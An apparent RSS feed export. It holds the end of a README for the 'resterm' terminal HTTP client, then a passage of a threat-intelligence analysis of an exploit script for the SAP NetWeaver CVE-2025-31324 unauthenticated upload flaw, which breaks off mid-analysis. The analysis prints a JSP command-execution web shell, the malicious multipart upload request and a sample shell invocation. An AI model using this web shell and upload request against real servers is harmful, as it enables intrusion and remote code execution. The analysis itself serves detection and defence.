      &lt;row span="2"&gt;
        &lt;cell&gt;Open environment selector&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;Ctrl+E&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Save current file&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;Ctrl+S&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Reparse document&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;Ctrl+R&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Refresh workspace file list&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;Ctrl+O&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Adjust sidebar split&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;Ctrl+Up&lt;/code&gt; / &lt;code&gt;Ctrl+Down&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Replay highlighted history entry&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;Enter&lt;/code&gt; (History tab)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Quit&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;Ctrl+Q&lt;/code&gt; (&lt;code&gt;Ctrl+D&lt;/code&gt; also works)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;h&lt;/code&gt;,&lt;code&gt;j&lt;/code&gt;,&lt;code&gt;k&lt;/code&gt;,&lt;code&gt;l&lt;/code&gt;- move left/down/up/right&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;w&lt;/code&gt;,&lt;code&gt;b&lt;/code&gt;,&lt;code&gt;e&lt;/code&gt;- jump by words (&lt;code&gt;e&lt;/code&gt;lands on word ends)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;0&lt;/code&gt;,&lt;code&gt;$&lt;/code&gt;,&lt;code&gt;^&lt;/code&gt;- start/end/first non-blank of line&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;gg&lt;/code&gt;,&lt;code&gt;G&lt;/code&gt;- top/bottom of buffer&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;Ctrl+f&lt;/code&gt;/&lt;code&gt;Ctrl+b&lt;/code&gt;- page down/up (&lt;code&gt;Ctrl+d&lt;/code&gt;/&lt;code&gt;Ctrl+u&lt;/code&gt;half-page)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;v&lt;/code&gt;,&lt;code&gt;y&lt;/code&gt;- visual select, yank selection&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;Shift+F&lt;/code&gt;- open search prompt;&lt;code&gt;Ctrl+R&lt;/code&gt;toggles regex while open&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;n&lt;/code&gt;- jump to the next match (wraps around)&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;--file&lt;/code&gt;: path to a&lt;code&gt;.http&lt;/code&gt;/&lt;code&gt;.rest&lt;/code&gt;file to open.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--workspace&lt;/code&gt;: directory to scan for request files.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--env&lt;/code&gt;: named environment from the environment set.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--env-file&lt;/code&gt;: explicit path to an environment JSON file.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--timeout&lt;/code&gt;: request timeout (default&lt;code&gt;30s&lt;/code&gt;).&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--insecure&lt;/code&gt;: skip TLS certificate verification.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--follow&lt;/code&gt;: follow redirects (default&lt;code&gt;true&lt;/code&gt;).&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--proxy&lt;/code&gt;: HTTP proxy URL.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--recurisve&lt;/code&gt;: recursively scan the workspace for&lt;code&gt;.http&lt;/code&gt;/&lt;code&gt;.rest&lt;/code&gt;files.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Environment files are simple JSON maps keyed by environment name, for example:&lt;/p&gt;
    &lt;code&gt;{
  "dev": {
    "baseUrl": "https://api.dev.local",
    "token": "dev-token"
  },
  "prod": {
    "baseUrl": "https://api.example.com"
  }
}&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;@name &amp;lt;identifier&amp;gt;&lt;/code&gt;- names the request for the file explorer and history.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@description &amp;lt;text&amp;gt;&lt;/code&gt;/&lt;code&gt;@desc &amp;lt;text&amp;gt;&lt;/code&gt;- attaches multi-line prose notes that travel with the request.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@tag &amp;lt;tag1&amp;gt; &amp;lt;tag2&amp;gt;&lt;/code&gt;- assigns tags for quick filtering (stored even if the current UI doesn’t surface them yet (it is in the roadmap)).&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@auth&lt;/code&gt;- injects authentication automatically. Supported forms:&lt;list rend="ul"&gt;&lt;item&gt;&lt;code&gt;@auth basic &amp;lt;user&amp;gt; &amp;lt;password&amp;gt;&lt;/code&gt;&lt;/item&gt;&lt;item&gt;&lt;code&gt;@auth bearer &amp;lt;token&amp;gt;&lt;/code&gt;&lt;/item&gt;&lt;item&gt;&lt;code&gt;@auth apikey &amp;lt;header|query&amp;gt; &amp;lt;name&amp;gt; &amp;lt;value&amp;gt;&lt;/code&gt;&lt;/item&gt;&lt;item&gt;&lt;code&gt;@auth Authorization &amp;lt;value&amp;gt;&lt;/code&gt;(custom header)&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@setting &amp;lt;key&amp;gt; &amp;lt;value&amp;gt;&lt;/code&gt;- per-request overrides. Recognised keys (&lt;code&gt;timeout&lt;/code&gt;,&lt;code&gt;proxy&lt;/code&gt;,&lt;code&gt;followredirects&lt;/code&gt;,&lt;code&gt;insecure&lt;/code&gt;), and&lt;code&gt;@timeout &amp;lt;duration&amp;gt;&lt;/code&gt;is accepted as a shorthand.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@no-log&lt;/code&gt;- skip storing the response body snippet for that request in history.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@script &amp;lt;kind&amp;gt;&lt;/code&gt;followed by lines beginning with&lt;code&gt;&amp;gt;&lt;/code&gt;- executes JavaScript either as&lt;code&gt;pre-request&lt;/code&gt;(mutate method/url/headers/body/variables) or&lt;code&gt;test&lt;/code&gt;blocks whose assertions appear in the UI and history.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Enable GraphQL handling by adding &lt;code&gt;@graphql&lt;/code&gt; to the request’s comment block. The request body captures the query, and an optional &lt;code&gt;@variables&lt;/code&gt; directive switches the subsequent body lines to JSON variables (or &lt;code&gt;&amp;lt; file.json&lt;/code&gt; to load from disk). &lt;code&gt;@operation &amp;lt;name&amp;gt;&lt;/code&gt; sets the &lt;code&gt;operationName&lt;/code&gt; field. Example:&lt;/p&gt;
    &lt;code&gt;# @graphql
# @operation FetchUser
POST https://api.example.com/graphql

query FetchUser($id: ID!) {
  user(id: $id) {
    name
  }
}

# @variables
{
  "id": "{{userId}}"
}
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;resterm&lt;/code&gt; packages this as &lt;code&gt;{ "query": ..., "variables": ... }&lt;/code&gt; for POST requests (or as query parameters for GET), sets &lt;code&gt;Content-Type: application/json&lt;/code&gt; when needed, and preserves the query/variables layout in previews and history.&lt;/p&gt;
    &lt;p&gt;GraphQL metadata&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;@graphql [true|false]&lt;/code&gt;- enable (default) or turn off GraphQL processing for the request.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@operation &amp;lt;name&amp;gt;&lt;/code&gt;(alias:&lt;code&gt;@graphql-operation&lt;/code&gt;) - populate the&lt;code&gt;operationName&lt;/code&gt;field.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@variables [&amp;lt; file.json]&lt;/code&gt;- start a variables block. Lines following the directive are treated as JSON until another directive is encountered; use&lt;code&gt;&amp;lt; file.json&lt;/code&gt;to load from disk.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@query &amp;lt; file.graphql&amp;gt;&lt;/code&gt;- optional helper if you prefer to load the main query from a file instead of inlining it.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Switch a request into gRPC mode by starting the request line with &lt;code&gt;GRPC host:port&lt;/code&gt; and declaring the method using &lt;code&gt;@grpc &amp;lt;package.Service&amp;gt;/&amp;lt;Method&amp;gt;&lt;/code&gt;. Optionally provide a compiled descriptor set (&lt;code&gt;@grpc-descriptor descriptors/service.protoset&lt;/code&gt;) or rely on server reflection (&lt;code&gt;@grpc-reflection true&lt;/code&gt;, the default). The request body should contain protobuf JSON for the request message, or use &lt;code&gt;&amp;lt; payload.json&lt;/code&gt; to load from disk. Example:&lt;/p&gt;
    &lt;code&gt;# @grpc my.pkg.UserService/GetUser
# @grpc-descriptor descriptors/user.protoset
GRPC localhost:50051

{
  "id": "{{userId}}"
}
&lt;/code&gt;
    &lt;p&gt;Headers and &lt;code&gt;@grpc-metadata key: value&lt;/code&gt; directives attach gRPC metadata. &lt;code&gt;resterm&lt;/code&gt; resolves templates before invoking the call, displays headers/trailers and the JSON response, and records each invocation in history with the gRPC status code.&lt;/p&gt;
    &lt;p&gt;gRPC metadata&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;@grpc &amp;lt;package.Service&amp;gt;/&amp;lt;Method&amp;gt;&lt;/code&gt;- specify the fully-qualified method name (package optional).&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@grpc-descriptor &amp;lt;path&amp;gt;&lt;/code&gt;- path to a compiled descriptor set (&lt;code&gt;protoc --descriptor_set_out&lt;/code&gt;).&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@grpc-reflection [true|false]&lt;/code&gt;- toggle server reflection (default&lt;code&gt;true&lt;/code&gt;).&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@grpc-plaintext [true|false]&lt;/code&gt;- override TLS usage for the channel.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@grpc-authority &amp;lt;value&amp;gt;&lt;/code&gt;- set the :authority pseudo-header for HTTP/2.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;@grpc-metadata &amp;lt;key&amp;gt;: &amp;lt;value&amp;gt;&lt;/code&gt;- add unary call metadata (repeat for multiple entries).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Inline, request-, and file-level variables resolve against the selected environment file (&lt;code&gt;resterm.env.json&lt;/code&gt; or &lt;code&gt;rest-client.env.json&lt;/code&gt;), then fall back to OS environment variables.&lt;/p&gt;
    &lt;p&gt;Pre-requisites: Go 1.22 or newer.&lt;/p&gt;
    &lt;p&gt;History is stored in &lt;code&gt;~/.config/resterm/history.json&lt;/code&gt; (using the platform-appropriate config directory). Override the location via the &lt;code&gt;RESTERM_CONFIG_DIR&lt;/code&gt; environment variable.&lt;/p&gt;
    &lt;code&gt;go test ./...
go run ./cmd/resterm --file _examples/basic.http&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Command palette &amp;amp; keymap customisation&lt;/item&gt;
      &lt;item&gt;Richer response tooling (streaming previews, save-to-file, diffing)&lt;/item&gt;
      &lt;item&gt;Better scripting support (shared helpers, setup/teardown, better assertions)&lt;/item&gt;
      &lt;item&gt;Themes &amp;amp; layout configuration&lt;/item&gt;
      &lt;item&gt;Support more curl flags&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45437906</guid><pubDate>Wed, 01 Oct 2025 14:07:04 +0000</pubDate></item><item><title>Technical Analysis of SAP Exploit Script Used in JLR, Harrods Hacks</title><link>https://detect.fyi/technical-analysis-of-sap-exploit-script-visual-composer-metadata-uploader-exploit-7b4a01b38548</link><description>&lt;doc fingerprint="35cb9d00a99e338f"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Technical Analysis of SAP Exploit Script (Visual Composer “Metadata Uploader” Exploit) CVE-2025–31324&lt;/head&gt;
    &lt;head rend="h2"&gt;Script Analysis of SHINYHUNTERS&lt;/head&gt;
    &lt;head rend="h2"&gt;Overview of the Exploit Script and Vulnerability&lt;/head&gt;
    &lt;p&gt;This script targets a critical zero-day vulnerability (now identified as CVE-2025–31324) in SAP NetWeaver’s Visual Composer Metadata Uploader component. The vulnerability is a missing authorization check on the HTTP endpoint /developmentserver/metadatauploader, allowing unauthenticated file uploads to the server’s filesystem[1][2]. By sending specially crafted HTTP POST requests to this endpoint, an attacker can upload arbitrary files (such as a malicious JSP web shell) and achieve remote code execution (RCE) under the privileges of the SAP service account (typically &amp;lt;sid&amp;gt;adm)[3][4]. The script in question automates this exploitation: it constructs and sends an HTTP POST with an embedded payload, and optionally drops a persistent shell on the SAP server. You can find the original script published by vx-underground here .&lt;/p&gt;
    &lt;head rend="h3"&gt;Key Points of the Vulnerability&lt;/head&gt;
    &lt;p&gt;Unauthenticated users can POST a file to the Visual Composer “metadatauploader” servlet, which then writes the file into a web-accessible directory (e.g. …/irj/servlet_jsp/irj/root/ in many SAP Portal setups)[5][6]. If the uploaded file is a JSP script or other executable code, the attacker can subsequently request that file via HTTP to execute code on the server[7]. The exploit script leverages this by uploading a web shell JSP and then (optionally) invoking it to run commands. In addition, the script appears to incorporate an OAST (out-of-band) check using a Java deserialization payload to quietly verify the vulnerability without immediately dropping a shell[8].&lt;/p&gt;
    &lt;p&gt;Below, we break down the script’s structure and functions, explain the exploitation method, highlight code patterns (such as payload encoding, web shell injection, and deserialization), identify indicators of compromise, and recommend mitigations. At the end of the summary you will find recommendation and unique attribution for Scattered Spider.&lt;/p&gt;
    &lt;head rend="h2"&gt;Script Functions and Structure Breakdown&lt;/head&gt;
    &lt;p&gt;The exploit script is organized into distinct functional components. Each function or code block serves a specific role in the attack sequence:&lt;/p&gt;
    &lt;p&gt;Initialization and Argument Parsing: The script begins by parsing user-supplied arguments (likely via argparse in Python). It supports targeting either a single SAP host or multiple hosts, with options to specify the protocol (HTTP/HTTPS) and port. It may accept a list of targets and a thread count for concurrent scanning/exploitation of multiple systems[8][9]. Key flags include a “check” mode (default) for safe vulnerability testing and an “exploit” mode for actual shell upload. For example, a — oast-host parameter is required for the OAST vulnerability check, and an — exploit-file parameter can be provided to upload a specific file in exploit mode[8][10]. The script likely also handles options like — threads (concurrency), — legacy-ssl (to allow older TLS versions), and — insecure (to skip SSL verification) to ensure it can connect to SAP servers even if they have outdated or self-signed certificates[9]. These options ensure the script can flexibly target many systems and remain robust against network issues.&lt;/p&gt;
    &lt;p&gt;Deserialization Payload Construction (OAST Check Mode): In its default vulnerability-check mode, the script uses a serialized Java object payload designed to trigger an out-of-band callback, confirming the system is vulnerable without dropping an obvious web shell. This is hinted by the script’s description: “Checks for vulnerability using Java Deserialization payload and OAST callback”[8]. In practice, the script likely embeds a malicious serialized object (possibly as a .dat or a specially crafted Visual Composer model file) encoded within the script (for example as a Base64 blob). A specific function decodes this blob to binary and prepares it for upload. The payload would be constructed such that, when processed by the SAP server, it forces the server to perform an action like a DNS lookup or HTTP request to the attacker’s OAST server, thereby signaling that the endpoint is exploitable. This provides a stealthy check — if the OAST platform receives the callback, the server is vulnerable. The use of a deserialization gadget suggests the SAP metadata uploader might implicitly deserialize certain file types (perhaps expecting a Java object for a model), which the script abuses with a gadget that performs a callback. This portion of code is obfuscated to hide the exploit payload: for instance, the serialized bytes might be stored as a long Base64 string in the script and decoded at runtime. Such obfuscation via Base64-encoding prevents casual observers or signature-based scanners from recognizing the exploit code in the script file. (In the provided script, one would see a large Base64 string and a decode function, strongly indicating this behavior.)&lt;/p&gt;
    &lt;p&gt;Exploit Mode — Web Shell File Upload: If the script is run in “exploit” mode (triggered by an argument like — exploit-file), it will attempt to upload a specified file (defaulting to a JSP web shell provided with the script, e.g. helper.jsp) to the target server. This is the core exploit function that achieves code execution. Internally, the script likely defines a function (e.g. upload_file(target, file_data)) that performs the following steps:&lt;/p&gt;
    &lt;p&gt;HTTP Request Assembly: It crafts an HTTP POST request to http[s]://&amp;lt;target&amp;gt;/developmentserver/metadatauploader. The request uses multipart/form-data encoding with a boundary string. The script may rely on a HTTP library (such as Python’s requests) to format the multipart request. For example, using requests.post(url, files={‘file’: (&amp;lt;filename&amp;gt;, &amp;lt;file_bytes&amp;gt;, ‘application/octet-stream’)}) automatically generates a content boundary and the necessary Content-Disposition header identifying the file field as “file”[11]. In captured exploit traffic, the Content-Type header appears as multipart/form-data; boundary=&amp;lt;random boundary&amp;gt; and the body contains a Content-Disposition: form-data; name=”file”; filename=”…jsp” line[11]. The script ensures the multipart form names the form field file (which the SAP servlet expects) and sets the filename to the desired name of the web shell on the server (e.g. “helper.jsp” or a randomized name). The raw data of the file is then included after this header.&lt;/p&gt;
    &lt;p&gt;Embedding the Payload: The payload itself in exploit mode is typically a JSP script (JavaServer Page) that functions as a web shell. If the user did not provide a custom file, the script may use a default payload (the script’s author included a file helper.jsp as a template web shell). This JSP is likely embedded or encoded within the script for convenience. Many malicious scripts include a web shell payload either in plain text or encoded form. Given the mention of “obfuscated and encoded payloads,” the helper.jsp content might be Base64-encoded in the script and decoded at runtime before transmission. Once decoded to its original JSP text, the script places it in the HTTP request body. In the example of an exploit observed in the wild, the JSP payload (named helper.jsp) was transmitted in the request body as shown below:&lt;/p&gt;
    &lt;code&gt;Content-Disposition: form-data; name=”file”; filename=”helper.jsp”&lt;lb/&gt; Content-Type: application/octet-stream&lt;lb/&gt; &lt;lb/&gt; &amp;lt;%@ page import=”java.util.*,java.io.*”%&amp;gt;&lt;lb/&gt; &amp;lt;%&lt;lb/&gt; if (request.getParameter(“cmd”) != null) {&lt;lb/&gt; String cmd = request.getParameter(“cmd”);&lt;lb/&gt; Process p = Runtime.getRuntime().exec(cmd);&lt;lb/&gt; … // (setup IO streams)&lt;lb/&gt; String line = (new DataInputStream(p.getInputStream())).readLine();&lt;lb/&gt; while (line != null) {&lt;lb/&gt; out.println(line);&lt;lb/&gt; line = (…readLine());&lt;lb/&gt; }&lt;lb/&gt; }&lt;lb/&gt; %&amp;gt;&lt;lb/&gt; — &amp;lt;boundary&amp;gt; — &lt;/code&gt;
    &lt;p&gt;Excerpt: HTTP POST with JSP payload (formatted for clarity)[11][12]. This JSP code is a simple command execution shell. It checks for a URL parameter cmd and, if present, uses Runtime.getRuntime().exec(cmd) to execute the specified system command on the SAP server[12]. The output of the command is read line by line and sent back in the HTTP response (via out.println)[13]. This essentially gives the attacker a remote terminal to the server through the web browser or curl. In the script’s code, this JSP was likely stored in encoded form and decoded before being sent, to avoid having the raw exploit code visible in the script file.&lt;/p&gt;
    &lt;p&gt;Optional Shell Drop Functionality: After uploading the JSP, the script may optionally trigger the shell or drop into an interactive mode. Some exploit scripts simply upload the web shell and inform the user of its location, leaving further interaction to the user. Others might immediately attempt to call the uploaded JSP to verify execution or even to spawn a reverse shell. There is evidence in related malicious activity that attackers, after uploading, performed an HTTP GET to the shell (e.g., /irj/helper.jsp?cmd=&amp;lt;command&amp;gt;) to run commands[14]. The provided script likely does not automatically launch a reverse shell (as that usually requires specifying a listener address), but it could have a feature to send a test command (like whoami) via the JSP to confirm it’s working. In either case, the “shell drop” refers to planting the JSP backdoor on the server. The JSP then remains accessible for the attacker to use at any time, providing persistent remote access.&lt;/p&gt;
    &lt;p&gt;Concurrency and Scanning Logic: Given the threat actor’s broad targeting, the script might include logic to scan or exploit multiple hosts in parallel. A function could iterate over a list of target addresses and, using a thread pool, attempt the exploit on each. This aligns with the script’s support for a — threads option[9]. In practice, the attacker could feed a list of SAP servers (perhaps discovered via internet scanning) into the script, which then concurrently checks each for vulnerability and either just logs the result (in check mode) or uploads a shell (in exploit mode). The script likely prints or logs the outcome for each target (and possibly can output to CSV/JSON for later review, as indicated by its features[9]).&lt;/p&gt;
    &lt;p&gt;Network and Error Handling: The script is built to be robust against network issues. It supports a “legacy SSL” mode to connect to older SAP servers with outdated SSL implementations, and an — insecure flag to ignore certificate verification (since many SAP servers might use self-signed certs)[9]. It also may implement automatic retries for transient failures (e.g., retry on SSL handshake errors or timeouts). Verbose logging (-v or -vv) is provided to aid troubleshooting by printing detailed request/response information. These features suggest the script was intended for use in real-world conditions where enterprise SAP servers might have quirky network settings.&lt;/p&gt;
    &lt;p&gt;In essence, one part of the script carefully prepares an exploit payload — either a benign gadget for checking or a malicious JSP for shell access — often hiding it via encoding, and another part delivers it via an HTTP POST to the vulnerable SAP endpoint. After the upload, the attacker can gain a foothold on the system by interacting with the newly planted web shell.&lt;/p&gt;
    &lt;head rend="h2"&gt;Exploitation Method: Payload Delivery and Execution&lt;/head&gt;
    &lt;p&gt;The method of exploitation used by this script is an unauthorized file upload leading to code execution. Here’s how the script carries out the exploit step by step:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Targeting the SAP Metadata Uploader: The script directs an HTTP POST request to the URL path /developmentserver/metadatauploader on the SAP server. This is the vulnerable endpoint that fails to enforce authentication[2][15]. The script may append query parameters like ?CONTENTTYPE=MODEL&amp;amp;CLIENT=1 in the request — these were observed in some exploit instances[16] — likely to mimic legitimate requests or satisfy the servlet’s expected inputs. (Those parameters suggest the uploader is intended to receive some “model” content; however, in practice they are not protected, so an attacker can ignore or include them. The script likely includes them for completeness.)&lt;/item&gt;
      &lt;item&gt;Crafting the Malicious Request: The HTTP POST is formatted as a multipart/form-data request. Within the request body, the attacker’s file is included as a part named “file”. For example, a real attack request was recorded as:&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;POST /developmentserver/metadatauploader?CONTENTTYPE=MODEL&amp;amp;CLIENT=1 HTTP/1.1&lt;lb/&gt; Host: victim-sap.example.com&lt;lb/&gt; User-Agent: python-requests/2.32.3&lt;lb/&gt; Content-Type: multipart/form-data; boundary= — — WebKitFormBoundary…&lt;lb/&gt; &lt;lb/&gt; — — — WebKitFormBoundary…&lt;lb/&gt; Content-Disposition: form-data; name=”file”; filename=”helper.jsp”&lt;lb/&gt; Content-Type: application/octet-stream&lt;lb/&gt; &lt;lb/&gt; [JSP web shell content]&lt;lb/&gt; &lt;lb/&gt; — — — WebKitFormBoundary… — &lt;/code&gt;
    &lt;p&gt;(Illustration of the exploit HTTP request). The script uses a Python HTTP library, which by default set the User-Agent to a string like python-requests/2.32.3[17] — indeed this was seen in logs of attacks, confirming the use of such scripting tools[17]. The presence of “python-requests” in SAP logs for this endpoint is a strong indicator of malicious use (normal SAP clients would not use this UA). The Content-Length header is computed based on the payload size. The multipart boundary can be random; some tools choose a fixed boundary or let the library generate one. For instance, an observed boundary 816121b0328c3864dc7963b2e0275e90 suggests the attacker’s tool generated a random 32-hex-character boundary[18]. (The Ionix POC script uses a simpler boundary “ — — ionix” in their examples[19], but real attacks tend to have random boundaries.)&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Payload Placement: The malicious payload (web shell) is included in the body following the headers. In our example, it’s a JSP file named helper.jsp. The script ensures the filename=”…” field in the Content-Disposition header matches the desired name. Some attacker scripts use randomized file names for the shell to evade simple file-name-based detection. For instance, Rapid7 reported that apart from known names like helper.jsp, most observed shell files had random 8-character names (e.g. cglswdjp.jsp, ijoatvey.jsp, etc.)[20]. It’s likely that the script can generate a random name for the uploaded file (e.g., by picking 8 random alphanumeric letters) instead of a static name. Using a random or innocuous-looking name (like 404_error.jsp or adding a dot prefix as in .webhelper.jsp) is a trick to blend in or hide on the server[21]. If the provided script specifically mentioned an “optional shell drop”, it may allow the operator to specify a name or use a default (which could be static like helper.jsp unless overridden). In any case, the file name in the request determines the name under which the file is saved on the server.&lt;/item&gt;
      &lt;item&gt;Server-Side Processing: Upon receiving this request, the vulnerable SAP servlet does no authentication or file type validation[22][23]. It simply accepts the file and writes it to a predetermined directory on the SAP application server. According to SAP and security researchers, the file lands in the Visual Composer web application’s directory. On SAP Portal systems, that path is typically:&lt;lb/&gt;…/irj/servlet_jsp/irj/root/&amp;lt;filename&amp;gt;[2][6]. (Full path on Windows: C:\usr\sap\&amp;lt;SID&amp;gt;\&amp;lt;InstID&amp;gt;\j2ee\cluster\apps\sap.com\irj\servlet_jsp\irj\root\helper.jsp, for example[24]. On Linux, a similar path under /usr/sap/&amp;lt;SID&amp;gt;/…/irj/root/ would be used.) In other deployments, Visual Composer might use a different context (Ionix notes an upload to visual_comp/servlet_jsp/myapp/root/ path[25]), but in observed attacks on Portal, irj/root was common. The key is that the file is placed in a web-accessible directory within the SAP Java server’s deployed applications.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Importantly, the server’s response to the upload request is not well documented in public sources — it might not explicitly confirm success. The script likely checks the HTTP status code (expecting 200 OK or possibly a 204) to infer if the upload succeeded. A failure (like 404 or 500 status) would indicate the endpoint is not present or the upload failed. In OAST check mode, success is determined by the out-of-band callback rather than the HTTP response content.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Triggering Code Execution: Once the file is uploaded, the attacker can execute it by sending an HTTP GET or POST request to the file’s URL. The exploit script might not automate this step in all cases (to avoid immediately tipping off with obvious malicious behavior), but the operator can manually do it or use another function in the script to invoke the shell. For example, after uploading helper.jsp, an attacker would navigate to http[s]://&amp;lt;target&amp;gt;/irj/helper.jsp?cmd=whoami. The JSP, running on the server, will read the cmd parameter and execute the whoami command on the OS, returning the output (e.g., the user under which SAP runs) in the HTTP response[12][13]. This confirms the RCE. The script’s “shell” functionality could be as simple as printing a message like “Web shell dropped at /irj/helper.jsp” or as interactive as opening a rudimentary command prompt. Some scripts might accept a — execute-cmd “&amp;lt;command&amp;gt;” argument to automatically run a given command via the shell and print the result. Given the question, the focus is on the script’s code; so we note that any such functionality would involve the script making an additional HTTP request to the uploaded JSP. (For instance, a quick GET request to helper.jsp?cmd=echo%20SUCCESS could verify the shell is working if the response contains “SUCCESS”.)&lt;/item&gt;
      &lt;item&gt;Alternate Payloads: While JSP is the most direct way to achieve code execution (since the SAP Java server will compile and run the JSP on access), the vulnerability could also accept other file types (WAR, EAR, JAR, or even OS binaries)[1]. The provided script appears geared toward JSP web shells, but it’s worth noting that an attacker could upload a compiled malicious .class or a .war file (web application) for more complex actions. In fact, the script’s OAST mode effectively uploads a serialized Java object (which could be seen as a .bin or .model file) to test the vulnerability. The mechanism is the same — the file is dropped on the server — but if the server tries to automatically deserialize or process it, it triggers the callback. Generally, though, the primary exploitation is the file upload; the post-exploitation is up to the attacker’s payload. In summary, the script reliably delivers a file to the server; what that file does can range from simple command execution to more stealthy backdoors.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Malicious Code Patterns and Obfuscation Techniques&lt;/head&gt;
    &lt;p&gt;The script and its payload exhibit several patterns characteristic of exploits, webshells, and obfuscation:&lt;/p&gt;
    &lt;p&gt;Obfuscated Payloads (Base64 Encoding): A notable pattern is the use of encoding to hide the actual malicious code within the script. Instead of containing the JSP shell in cleartext, the script likely stored it as an encoded string to avoid detection. Base64 is commonly used for this purpose. For example, the JSP code snippet shown earlier, if Base64-encoded, would appear as a long string of seemingly random characters in the script (e.g., PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT4K…). The script contains code to decode this string at runtime (using a function or library call) to retrieve the original JSP text before sending it in the HTTP request. This technique prevents simple signature-based detection of the script file — an analyst looking at the script without executing it would not immediately see the malicious JSP content. Only by decoding the blob (or observing the network traffic) does the payload become evident. Obfuscation may also involve trivial transformations like string concatenation or XOR encoding, but Base64 is most likely here given its common use and mention in related analysis (attackers have also used Base64 to encode commands sent to the shell, as noted below). In summary, the script deliberately hides its exploit payload in an encoded form to evade casual inspection.&lt;/p&gt;
    &lt;p&gt;Web Shell Code (Command Injection): The JSP payload code itself is a classic pattern of code injection on the server. As cited earlier, the JSP uses Runtime.getRuntime().exec() to execute OS commands[12]. This is analogous to a command injection, where the script takes attacker-controlled input (cmd parameter) and feeds it to a system shell. The pattern of reading the output with input streams and printing it back to the response is typical of web shells[13]. There is no authentication or hardcoded secret in the simplest variant (meaning anyone who knows the URL can use the shell). More advanced variants observed (like ran.jsp or usage.jsp in some incidents) included a simple password check — e.g., requiring a specific key parameter to be present — to prevent unauthorized use by others[26]. However, the helper.jsp shown in our example has no such protection and is small (only ~15 lines). This pattern of code (if-parameter-exec-output) is a strong indicator of a webshell when found on a server. The script’s role is to deliver this code to the server, but not necessarily to generate it — the code is likely pre-written by the exploit author.&lt;/p&gt;
    &lt;p&gt;Shell Upload Pattern in the Script: In the script’s code, the routine that handles file upload likely uses the requests library or http.client to perform the multipart form submission. If using requests, the pattern might be:&lt;/p&gt;
    &lt;code&gt;files = {“file”: (filename, payload_bytes, “application/octet-stream”)}&lt;lb/&gt; resp = requests.post(url, files=files, verify=False, timeout=… )&lt;/code&gt;
